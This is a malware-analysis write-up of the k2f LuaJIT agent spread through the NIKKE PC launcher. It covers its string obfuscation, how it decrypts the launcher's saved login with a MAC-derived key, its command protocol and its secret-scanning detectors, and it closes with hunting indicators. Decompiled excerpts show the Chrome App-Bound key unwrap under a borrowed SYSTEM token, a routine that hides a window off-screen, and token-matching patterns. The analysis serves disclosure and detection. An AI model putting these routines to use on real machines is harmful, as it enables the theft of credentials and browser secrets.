---
title: "The NIKKE launcher's k2f agent decrypts the saved login with a key made from the MAC address"
date: 2026-11-14
slug: "k2f-nikke-launcher-bundle"
description: "The LuaJIT bundle delivered through the NIKKE PC launcher, read from its bytecode: the Prometheus parameters behind its string table and a decoder that reads them from the bytecode instead of hard-coding them, the TEA cipher and MAC-derived key that creds uses on the launcher's saved login, a launcher popup moved off-screen, the k2f_chan protocol field by field, and the 37 token detectors in keyscan."
tags: ["k2f", "luajit", "lua", "prometheus", "credential-theft", "supply-chain", "windows"]
sample:
  family: "k2f agent (LuaJIT bundle)"
  sha256: "cc0ad05bfe85940a6067b3a72c182d3953339129206634141926d5d0b35973ec"
  source: "[Hybrid Analysis](https://www.hybrid-analysis.com/sample/cc0ad05bfe85940a6067b3a72c182d3953339129206634141926d5d0b35973ec)"
toc: true
---

The `creds` command of the k2f agent decrypts the NIKKE launcher's saved login with a 16-round TEA, and the key is the first 16 hex characters of MD5 over a network adapter's MAC address. That is one of a handful of things the agent's bytecode shows that the published accounts don't. The others are how its strings are hidden (Prometheus's constant array, with parameters that change on every build), a launcher popup it moves off-screen, its request protocol down to the field names and error codes, and the 37 token detectors in its secret scanner.

The agent reached NIKKE PC launcher users as a 205,135-byte file of stripped LuaJIT bytecode saved under the launcher's log folder. Bitdefender [published the campaign](https://www.bitdefender.com/en-us/blog/labs/nikke-game-launcher-malware) on November 12 (Florin Cristian Cocolas and Janos Gergo Szeles): delivery through the launcher's task channel, the `k2f_chan` registration, the command list, and exfiltration through the launcher's telemetry. The most complete account is community work. [MotherSphere's write-up](https://gist.github.com/MotherSphere/d6c049a09ba8ac3085c51ee9df24a4e5), first posted November 3 and updated since, covers the tampered launcher JavaScript, the five request types the agent answers, the server-side decryption of browser data, the Chrome persistence DLL, the target paths and the timeline. [WormW](https://github.com/WormW/nikke_malware_analysis) published the bytecode format and two string-table decoders, and [whykusanagi](https://github.com/whykusanagi/nikke_malware) a checker and removal kit. The bundle isn't on MalwareBazaar; Hybrid Analysis has the file (submitted November 5) with no sandbox report. I read it statically with my own dump parser and disassembler, the [ljd](https://github.com/Aussiemon/ljd) decompiler, and Python. Nothing was run. The [decoder](https://github.com/stateless-re/tools/tree/main/families/k2f) is in the tools repo.

## What I found

- The string table is Prometheus's ConstantArray step, strings only, with its default mixed encoding: 1,790 strings rotated by three reversals, each one base64 or base85 with a shuffled alphabet chosen by its first character, read through `T[i - 46736]`. Prometheus draws every one of those values at random on each run (unless a fixed seed is set), so a decoder that hard-codes them works on this build only.
- `creds` reads `psd.dat` from `%APPDATA%\nikke_launcher`, keys a 16-round TEA in Tencent's padded block format with `MD5(MAC)[:16]`, and decrypts the account's password the same way.
- Unless the launcher defines its own layout for `download_tips_view`, `channel` supplies one that moves the window to (-32000, -32000) and shrinks it to 1×1 pixels.
- `k2f_chan` takes five operations with numbered sessions, a 2 MiB default read size, and the error codes `EOP`, `EOPEN`, `EBADSID` and `EIO`; commands run either buffered on first read or as streams.
- `keyscan.detect` holds 37 prefix-and-run detectors, mostly for API tokens (cloud, source hosting, package registries, payments, messaging, and seven for AI and model-hosting services) plus three hand-written ones. The bundle contains no AES; the App-Bound key leaves as its parts.


## The strings are Prometheus, in LuaJIT 2.0 bytecode

The file starts with `1B 4C 4A 01 02`: the LuaJIT magic, dump version 1, and flags `0x02` (stripped, no debug info). Version 1 is the 2.0 format; the 2.1 branch moved to version 2 in [February 2013](https://github.com/LuaJIT/LuaJIT/commit/73ef845f), and its reader rejects any other version. Bitdefender calls the bundle LuaJIT 2.1 bytecode; WormW and MotherSphere both have it as 2.0, and the bundle agrees: `payload_cleanup` refuses to delete any file whose first four bytes aren't `\27LJ\1`. Parsed with the 2.0 opcode table, the dump splits into 339 function prototypes and ends on its last byte.

The last prototype is a wrapper that calls the next-to-last one with `...`. That one, prototype 337, starts like this (my disassembler; register numbers as in the bytecode, loop bodies trimmed):

```text
0000 TDUP   0 0      ; table of 1,791 slots, 1,790 strings      // (1)
0001 FNEW   1 1      ; F0 = function(i) return T[i - 46736] end // (2)
0002 GGET   2 2      ; 'ipairs'
0004 TDUP   4 3      ; {1, 1790}                                // (3)
0006 TDUP   4 4      ; {1, 1341}
0008 TDUP   4 5      ; {1342, 1790}
0012 TGETB  7 6 1    ; reverse T[a..b] in place
...
0046 TDUP   9 15     ; 64 entries: 't'=0 'C'=1 'N'=2 ...       // (4)
0047 TDUP   10 16    ; 85 entries: '/'=0 '('=1 'k'=2 ...
0065 ISNES  17 18    ; first char == 'T' ?                      // (5)
0153 ISNES  17 20    ; first char == '1' ?
```

(1) is the string array. (2) is the accessor every other function calls: `F0(47106)` is `T[370]`, which turns out to be `preload`. (3) is three pairs of indices; the loop reverses the whole array, then the first 1,341 entries, then the rest, which rotates it. (4) is two lookup tables, character to value, for a shuffled 64-character alphabet and a shuffled 85-character one. (5) picks the decoder by the first character: `T` means base64 with `=` padding, `1` means base85 in groups of five, where a short final group is padded with the value 84 and yields one byte less than its length.

MotherSphere and whykusanagi name the obfuscator as Prometheus. Its [`ConstantArray.lua`](https://github.com/prometheus-lua/Prometheus/blob/master/src/prometheus/steps/ConstantArray.lua) has every piece above: `Rotate` with the three `reverse` calls, a wrapper offset drawn from `±MaxWrapperOffset` (default 65,535), and `Encoding = "mixed"`, which became the default on 2026-03-24 and picks base64 or base85 per string, marked by two random prefix characters. Numbers stay inline in this bundle's bytecode and only strings went into the array, so the step ran with `StringsOnly = true`, as Prometheus's presets set it. The alphabets, the prefixes, the rotation point and the offset all change on every obfuscation run unless a fixed seed is given. WormW's `decode_bundle_strings.py` hard-codes this build's alphabets; their `lj_bcdump.py` already pulls the array and both alphabets out of the raw dump but hard-codes the prefixes, the offset 46736 and the rotation ranges. The [decoder in the tools repo](https://github.com/stateless-re/tools/tree/main/families/k2f) also finds the rotation pairs and the accessor offset in the bytecode, and works out which prefix means which encoding by trying both. I tested it on this bundle and on six files of my own: one benign script, obfuscated three times with Prometheus's Weak preset and compiled with LuaJIT 2.0 and 2.1. All six decode, with different prefixes, offsets of both signs and different rotation points. Its output for the bundle (abridged and reflowed):

```json
{
  "sha256": "cc0ad05bfe85940a6067b3a72c182d3953339129206634141926d5d0b35973ec",
  "bytecode": {"version": 1, "luajit": "2.0", "stripped": true, "prototypes": 339, "consumed": 205135},
  "string_table": {
    "prototype": 337, "entries": 1790,
    "rotation": [[1, 1790], [1, 1341], [1342, 1790]],
    "prefixes": {"base64": "T", "base85": "1"},
    "accessor_offset": -46736, "index_range": [46737, 48526]
  },
  "build": "722b99d8d0e9",
  "modules": [{"name": "base64", "proto": 6}, {"name": "json", "proto": 29}, "... 44 more"]
}
```

The build tag matches the `K2F_LUA_BUILD` value Bitdefender published, the ten lookups WormW lists come out the same, and all 1,790 strings match a second decoder I wrote straight from the disassembly. With the strings in place, ljd's output becomes readable Lua. The rest of this post quotes that output with the decoded strings substituted and the names cleaned up. ljd loses track of upvalues in a stripped dump, so I checked the quoted claims against the bytecode; the fact-check before publishing still caught two I had read wrong.

## Forty-six modules, nineteen commands

The main chunk clears `package.loaded` for every name already in `package.preload`, assigns 46 functions to `package.preload[name]`, and ends with `return require("channel")`. The modules, grouped by role:

| Group | Modules |
|---|---|
| support | `base64`, `json`, `cwd`, `dispatch`, `channel` |
| Windows layer | `win32.ffi_defs`, `win32.fs`, `win32.screens`, `win32.text`, `win32.exec`, `win32.registry`, `win32.chrome`, `win32.extensions`, `win32.hook`, `win32.system`, `win32.firefox`, `win32.whoami`, `win32.creds`, `win32.sysinfo` |
| secret scanning | `keyscan`, `keyscan.windows`, `keyscan.extra`, `keyscan.read`, `keyscan.detect`, `keyscan.sources`, `keyscan.collect`, `keyscan.browser` |
| commands | `commands.screens`, `.ls`, `.cat`, `.cd`, `.download`, `.payload_cleanup`, `.file_chunk`, `.exec`, `.chrome_scan`, `.host_facts`, `.wallet_files`, `.chrome_install`, `.chrome_cleanup`, `.chrome_uninstall`, `.keyscan`, `.browserscan`, `.whoami`, `.creds`, `.sysinfo` |

Every Windows call goes through LuaJIT's FFI, with the `ffi.cdef` declarations stored in the string table. SQLite comes from Windows' own `C:\Windows\System32\winsqlite3.dll`. `dispatch` maps 19 command names to modules: 18 loaded directly and `screens`, loaded with `pcall` and left out if it fails. Bitdefender's text counts 18 operator-facing commands; its table lists the same 19 names.

## k2f_chan, field by field

MotherSphere's write-up says the agent registers `k2f_chan` with the launcher's `comm_center` and then answers only `open`, `read`, `write`, `ping` and `close`, with output in base64 chunks of up to 2 MiB. The bytecode confirms it. `channel` ends with:

```lua
if type(rawget(_G, "comm_center")) == "table" and type(comm_center["reg_service"]) == "function" then
    comm_center["reg_service"]("k2f_chan", M["handle"])
end
return M
```

`comm_center` is a global of the launcher's Lua environment, not of the bundle. WormW's command-surface notes read `k2f_chan` as a named pipe with commands arriving on stdin; the pipe functions there (`CreatePipe`, `PeekNamedPipe`) belong to `win32.exec`, which uses anonymous pipes to read a child process's output. The handler takes a decoded JSON table and answers with another:

| `op` | Request fields | Reply | Errors |
|---|---|---|---|
| `open` | `cmd`, `arg` (table), `mode` (`"stream"` or absent) | `ok`, `sid`, `size` | `EOP` if `cmd` isn't a string, `EOPEN` if the command is unknown or fails to start |
| `read` | `sid`, `max` (default 2,097,152) | `ok`, `data` (URL-safe base64), `eof`; for streams that report them, `exit_code` and `timed_out` | `EBADSID`, `EIO` |
| `write` | `sid`, `data` (base64) | `ok` | `EBADSID`, `EOP` if the data isn't base64, `EIO` |
| `ping` | none | `ok` | none |
| `close` | `sid` | `ok` | none |

Any other `op` gets `EOP`, and an error anywhere inside becomes `EIO` with the message. Session IDs count up from 1. Without `mode`, `open` runs nothing yet: the first `read` runs the command, buffers its whole output, and later reads page through it. In stream mode the command supplies its own reader; four commands have one (`download`, `file_chunk`, `exec`, `browserscan`), and `exec`'s stream plus `write` is the interactive shell its error message mentions ("use the interactive shell to run without a deadline"). Bitdefender's table gives `file_chunk` 2 MiB reads; 2 MiB is the channel's default, while `file_chunk` itself, in buffered mode, returns at most 524,288 bytes per call.

Above the handler, `channel` installs three things on `download_tips_view`: an empty `close`, and a `default_layout` built from two helpers (cleaned up; the names are mine):

```lua
local function hide(id)
    if type(rawget(_G, "ui_utility")) ~= "table" or type(ui_utility["setproperty_by_id"]) ~= "function" then return end
    if type(id) ~= "number" or id <= 0 then return end
    pcall(ui_utility["setproperty_by_id"], id, "XOffset", "-32000")
    pcall(ui_utility["setproperty_by_id"], id, "YOffset", "-32000")
    pcall(ui_utility["setproperty_by_id"], id, "Width", "1")
    pcall(ui_utility["setproperty_by_id"], id, "Height", "1")
end

if type(rawget(_G, "download_tips_view")) ~= "table" then _G["download_tips_view"] = {} end
if type(download_tips_view["default_layout"]) ~= "function" then
    download_tips_view["default_layout"] = function(id, opts) hide(id); drop_modal(id, opts) end
end
```

`drop_modal` does nothing unless the launcher's `poptips_view` has `_close` and `get_ctr_data` and `opts.is_multi_win` is set; then it clears `opts.modal` and closes the matching control through `poptips_view._close`. A window laid out by `download_tips_view` ends up one pixel square at a position no monitor shows. All of this is installed only where the launcher hasn't defined it, so it fills a gap and overrides nothing; if the launcher has its own `default_layout`, nothing is hidden. I think, without being able to check, that this hides the launcher window the operator's script runs in: the requests have to come from script in the launcher's webview, MotherSphere traced that script to the modified launcher JavaScript, and a popup holding it would otherwise be visible. I found no mention of this code in the reports or the community repositories.

## creds decrypts the launcher's saved login

MotherSphere corrected an early claim on November 4: `creds` takes the NIKKE login the launcher saved, not Credential Manager (Bitdefender's table still says Credential Manager through DPAPI). Here is how. `win32.creds` reads `psd.dat` and `last_user.dat` from `%APPDATA%\nikke_launcher` or `%APPDATA%\nikke_launcher_hmt`, enumerates network adapters with `GetAdaptersInfo`, and builds a candidate key from each MAC address:

```text
mac = uppercase hex of the adapter address, no separators
key = first 16 characters of lowercase hex MD5(mac), used as 16 ASCII bytes
```

It decrypts both files with that key and parses the result as JSON, moving on to the next adapter if either file doesn't decode. It then finds the account named in `last_user.dat`, base64-decodes that account's `pwd` field and decrypts it with the same key, and returns `{account, password}`. MD5 comes from `BCryptOpenAlgorithmProvider("MD5")`, the only algorithm name the bundle gives BCrypt.

The cipher is TEA with 16 rounds instead of the usual 32. The round function (prototype 306) starts at `sum = 0x9E3779B9 * 16` and is otherwise the textbook TEA decryption. Prototype 307 chains 8-byte blocks as `P[i] = D(C[i] ^ X[i-1]) ^ C[i-1]`, where `X[i-1]` is the previous block's raw TEA output and both start at zero, then strips a layout of one header byte (its low three bits are the pad length), the pad, two salt bytes, the data, and seven trailing bytes, which it drops without checking that they are zero. That matches the TEA variant in Tencent's client libraries, which fits a launcher from a Tencent-owned publisher. The key depends only on values any program on the machine can read, so I'm describing it, not publishing a decryptor for the file.

## The App-Bound path stops before AES

MotherSphere writes that `browserscan` sends the encrypted values and the keys and that the server decrypts them, and that the SYSTEM-token path needs the launcher to run as administrator, which its manifest requests. The bytecode shows the steps (trimmed, error handling removed):

```lua
local XOR_KEY = "ccf8a1cec56605b8517552ba1a2d061c03a29e90274fb2fcf59ba4b75c392390"

local function app_bound(local_state, key_name)
    local blob = base64.decode(local_state.os_crypt.app_bound_encrypted_key)
    if blob:sub(1, 4) ~= "APPB" then return nil, "not an APPB container" end
    local outer = system.with_system(function() return dpapi(blob:sub(5)) end)   -- (1)
    local data = parse_header(dpapi(outer))                                       -- (2)
    if #data == 32 then return { key = data, scheme = "raw" } end
    if data:byte(1) ~= 3 or #data < 93 then return nil, "unsupported container" end
    local enc = data:sub(2)
    local k = system.with_system(function()
        return system.ksp_decrypt(key_name, enc:sub(1, 32))                      -- (3)
    end)
    return { scheme = "abe", kdf = xor(k, hex(XOR_KEY)),                          -- (4)
             iv = enc:sub(33, 44), ct = enc:sub(45, 76), tag = enc:sub(77, 92) }
end
```

`with_system` (1) walks the process list for `services.exe`, duplicates its token and sets it on the thread with `SetThreadToken`. The first DPAPI layer comes off as SYSTEM, the second (2) as the user. A container with flag byte 3 holds an AES key that is itself encrypted: (3) opens `Google Chromekey1` (`Microsoft Edgekey1` for Edge) in the `Microsoft Software Key Storage Provider` and calls `NCryptDecrypt`, and (4) XORs the result with a fixed 32-byte value. This is the publicly documented [v20 unwrap](https://github.com/runassu/chrome_v20_decryption), with the same XOR constant, rewritten for LuaJIT's FFI; the reference code borrows the token of `lsass.exe`, the bundle that of `services.exe`.

Then it stops. The function returns the XORed key, the IV, the ciphertext and the tag as separate base64 fields (`abe_ctx` in the output) instead of running AES-GCM to get the final key, and the value formatter treats saved passwords and cookies the same way: it strips the `v10` or `v20` prefix and base64-encodes the rest, or marks the entry `locked` when no key was found. I checked for an AES step that might live elsewhere and there is none: no `BCryptDecrypt` declaration, no AES S-box (no table constant holds 16 or more numbers, and the only big number-valued tables are the two alphabets), and no AES or GCM string. The classic Chrome key does leave in the clear, already unwrapped from DPAPI, which is all anyone needs for `v10` values. Firefox's `key4.db` and `logins.json` go out whole. Cookies go too unless the operator sets `collect_cookies` to `false`.

## keyscan matches tokens without regular expressions

MotherSphere's [target-path list](https://gist.github.com/MotherSphere/d6c049a09ba8ac3085c51ee9df24a4e5) covers what `keyscan` reads. In the bytecode that is `keyscan.sources`, 131 entries of `{tool, format, paths}` for 104 tools, 14 of them AI coding assistants, plus nine collectors (`ssh_targets`, `git_credentials`, `environment`, `history`, `kube`, `credman`, `sessions`, `gpg`, `host_stores`) and a project-folder walk over `source`, `code`, `dev`, `Programming`, `Documents` and `Desktop`. Each source entry names a format (`json` 53 times, `lines` 19, `yaml` 17, `toml` 12, and nine other formats including `dpapi`, `sqlite`, `pgpass` and `filezilla`) so the reader can pull values out of a file instead of shipping it whole.

What decides whether a value counts as a secret is `keyscan.detect`. Lua patterns have no alternation and no counted repetition, so the module carries its own matcher: each detector is a list of steps, either "one of these literals" or "a run of characters from this set, between m and n long".

```lua
{ "aws-access-key", { lit({"AKIA", "ASIA", "ABIA", "ACCA", "A3TA", ... "A3T9"}), run("A-Z2-7", 16) } },
{ "github",         { lit({"ghp_", "gho_", "ghu_", "ghs_", "ghr_"}),            run("A-Za-z0-9_", 36) } },
{ "jwt",            { lit("eyJ"), run("A-Za-z0-9_-", 10, inf), lit("."),
                      run("A-Za-z0-9_-", 10, inf), lit("."), run("A-Za-z0-9_-", 10, inf) } },
```

There are 37 detectors in the table. All but one require a non-word character on both sides of the match; `slack-webhook` sets `boundary = false`. Seven are for AI and model-hosting API keys; most of the rest cover cloud providers, source hosting, package registries, payments, messaging and observability, plus JWTs, `age` secret keys and Slack webhooks, which is where the three `hooks.slack[.]com` URL prefixes in the table come from. Three more are hand-written functions, run before the table: PEM private-key blocks, an older API-key format that embeds a fixed base64 marker, and the Azure client-secret shape with `Q~` near the start. The prefixes are the ones public secret-scanning rule sets use; this reads like a port of one into Lua.

## chrome_install, briefly

The Chrome persistence is documented in detail by MotherSphere: a per-user `InprocServer32` value for CLSID `{E77CC89B-7401-4C04-8CED-149DB35ADD04}` pointing at `platform_experience_helper.dll` in a 64-hex folder under `%LOCALAPPDATA%\Google\Chrome\User Data\PlatformExperienceHelper`, with the agent ID and a token patched into each copy. The bytecode adds the argument names and checks. `chrome_install` takes `dll` (base64), `agent` (32 hex characters), `token` (64 hex) and `sha` (64 hex). `win32.hook` writes the agent ID over the 32 zeros after `/px/`, writes the token over the 64-character `BEARER000…` placeholder, and refuses if either placeholder is missing or appears twice, or if the length changes. `win32.chrome` writes the file and sets the value under HKCU (`write_string` in `win32.registry` uses the `0x80000001` handle), skips both if they already match, deletes other hash folders, and removes the two older layouts MotherSphere lists.

## Wrong turns

I started out to publish the first decoder for this string table. WormW had published two by November 4. Then, with the angle moved to what the bytecode adds, I drafted most of this post from a summarized fetch of MotherSphere's write-up and credited myself with the five operations, the server-side decryption and the `chrome_install` patching. Reading the full text through the API showed all three were already there. What's left in this post as new is narrower and, I hope, all real.

I also took the "decrypts Chrome passwords" part of Bitdefender's description at face value while reading `keyscan.browser`, and spent a while looking for an AES routine by name before checking the constants. The formatter that returns `value:sub(4)` base64-encoded was the giveaway.

A tool note: `hybrid search <sha256>` returned no reports for this hash, while `hybrid info` returned the file. A file can be on Hybrid Analysis with no sandbox report, and the search lists reports, not files.

## What I couldn't determine

The bundle never names the operator's endpoint; the delivery URL and the exfiltration path come from Bitdefender's capture and MotherSphere's analysis of the DLL. I don't know what the `download_tips_view` layout is used for in an unmodified launcher, which would settle what the hidden window is. The October 23 bundle MotherSphere lists (`60fd53ab…`, 165,108 bytes) isn't on MalwareBazaar or Hybrid Analysis, so I couldn't diff two builds or test the decoder on a second real one. Neither is the DLL.

## Hunting

Host:
- HKCU `Software\Classes\CLSID\{E77CC89B-7401-4C04-8CED-149DB35ADD04}\InprocServer32` with a default value under `User Data\PlatformExperienceHelper\<64 hex>\`. Strong alone. Chrome's own folder of that name is normal; the hash subfolder is not (MotherSphere).
- Files in the launcher's `log\tinyget` folder that start with `1B 4C 4A 01`, or named `k2f*.lua`. Strong alone.
- `%TEMP%\k2f-bcreds-<unix time>-<6 digits>.db` and its `-wal`/`-shm` copies, and screenshots named `k2f_screen_<unix time>_<n>.jpg`. Strong alone, but they are normally deleted right after use (MotherSphere).
- The launcher process opening `services.exe` for token access, or opening `Google Chromekey1` or `Microsoft Edgekey1` with `NCryptOpenKey`. Strong for any process that isn't the browser or its elevation service.
- The launcher process reading many developer credential files in a short time (`~\.aws\credentials`, `~\.azure\msal_token_cache.bin`, `.env` files under `source` or `Documents`). Moderate alone; strong next to the above.
- Child processes of the launcher created with `CREATE_NO_WINDOW` (`exec` passes `0x08000000`). Moderate.
- The launcher reading its own `psd.dat` is normal and not a lead.

Network (from the reports; the bundle names no host):
- `analytics.insightjs[.]com`, path `/comm/assets/insight.bundle`, and `89.127.233[.]127` (Bitdefender); `89.126.250[.]172` until about October 21 (MotherSphere).
- POSTs to `/px/<32 hex>` with a 64-hex bearer token from processes that load the DLL, per the placeholders in `win32.hook` and MotherSphere's DLL notes.

Static:
- LuaJIT version-1 dumps larger than about 50 KB inside `.log` files (Bitdefender's lead).
- A Prometheus mixed-encoding array: a constant table where every string starts with one of two characters, in the same prototype as one 64-entry and one 85-entry character-to-integer table. Weak alone, since Prometheus is a general tool; the [decoder](https://github.com/stateless-re/tools/tree/main/families/k2f) confirms in one run and reports `K2F_LUA_BUILD` when it is set.

## Indicators

| SHA-256 | Role |
|---|---|
| `cc0ad05bfe85940a6067b3a72c182d3953339129206634141926d5d0b35973ec` | k2f LuaJIT bundle, build `722b99d8d0e9`, 205,135 bytes (Bitdefender; on Hybrid Analysis) |
| `60fd53ab7356384ba2161b9bc84420cd170905011a2f3ca09f3e38fe3122f3a1` | earlier bundle, October 23, 165,108 bytes (MotherSphere, WormW; could not obtain, not on MalwareBazaar or Hybrid Analysis) |
| `f3e93d049851d5c19552c7d9b73c8be4580dc9d549e8f65f9f0c357c1df9d252` | `platform_experience_helper.dll`, one victim's copy (WormW; could not obtain, not on MalwareBazaar or Hybrid Analysis; patched per victim) |
| `2f2aac505f486067af6831d6c75ea74df63acb1ed4e4002709c5962c68bd9203` | tampered launcher `FeedList.feb647c9.js` (MotherSphere; on MalwareBazaar) |

| Other indicator | Context |
|---|---|
| `analytics.insightjs[.]com`, `insightjs[.]com` | delivery domain (Bitdefender) |
| `89.127.233[.]127` | delivery server (Bitdefender) |
| `89.126.250[.]172` | earlier server (MotherSphere) |
| `{E77CC89B-7401-4C04-8CED-149DB35ADD04}` | CLSID set under HKCU by `chrome_install` |
| `k2f_chan` | service name registered with `comm_center` |
| `722b99d8d0e9` | `K2F_LUA_BUILD` of this bundle |

## ATT&CK

| ID | Technique | In this bundle |
|---|---|---|
| T1195.002 | Compromise Software Supply Chain | delivered through the launcher's own front-end and task channel (reports) |
| T1027 | Obfuscated Files or Information | Prometheus constant array in stripped LuaJIT bytecode |
| T1036.008 | Masquerade File Type | bytecode saved as a `.log` file |
| T1546.015 | Component Object Model Hijacking | HKCU `InprocServer32` for a CLSID, set by `chrome_install` |
| T1564.003 | Hidden Window | `download_tips_view` windows moved off-screen; `exec` children with `CREATE_NO_WINDOW` |
| T1555.003 | Credentials from Web Browsers | Chromium and Firefox stores, App-Bound key unwrap |
| T1555.004 | Windows Credential Manager | `credman` collector in `keyscan` |
| T1552.001 | Credentials In Files | `keyscan.sources`, project `.env` files, the launcher's `psd.dat` |
| T1134.001 | Token Impersonation/Theft | `services.exe` token duplicated and set on the thread |
| T1113 | Screen Capture | `screens` |
| T1059.003 | Windows Command Shell | `exec` |
| T1070.004 | File Deletion | `payload_cleanup` |

## Ending

The launcher's saved login is protected by a key derived from the MAC address, which any process on the machine can read, and the k2f agent undoes it in a few small Lua functions. Browser passwords and cookies leave as ciphertext with their keys alongside, everything else as plain answers to five JSON requests. The detections that hold up are on the host, where the bundle has to do things no launcher does: borrow a SYSTEM token, open Chrome's KSP key, and write a COM registration that points into Chrome's profile folder.

## Credits and further reading

- Florin Cristian Cocolas and Janos Gergo Szeles (Bitdefender), [Attackers turn NIKKE's game launcher into malware](https://www.bitdefender.com/en-us/blog/labs/nikke-game-launcher-malware): discovery, delivery, the command list.
- MotherSphere, [NIKKE PC launcher compromise](https://gist.github.com/MotherSphere/d6c049a09ba8ac3085c51ee9df24a4e5): the JavaScript loader chain, the request types, the Chrome DLL, the target paths, the timeline, and the many people credited in it.
- WormW, [nikke_malware_analysis](https://github.com/WormW/nikke_malware_analysis): bytecode format notes and the first string-table decoders.
- whykusanagi, [nikke_malware](https://github.com/whykusanagi/nikke_malware): checker, removal kit and IOC list.
- The [Prometheus](https://github.com/prometheus-lua/Prometheus) obfuscator source, [LuaJIT](https://github.com/LuaJIT/LuaJIT) source for the dump format, and the [ljd](https://github.com/Aussiemon/ljd) decompiler.
- runassu, [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption): the public App-Bound unwrap this bundle reimplements.
